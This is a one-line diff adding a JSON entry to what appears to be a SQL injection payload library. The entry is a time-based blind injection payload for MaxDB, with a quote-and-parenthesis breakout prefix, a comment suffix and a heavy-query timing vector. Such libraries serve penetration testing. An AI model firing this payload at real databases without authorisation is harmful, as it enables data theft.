@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "time", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B} AND (SELECT (SELECT COUNT(*) FROM DOMAIN.TABLES))", "comment": "maxdb time: single in 2 parens ws"}
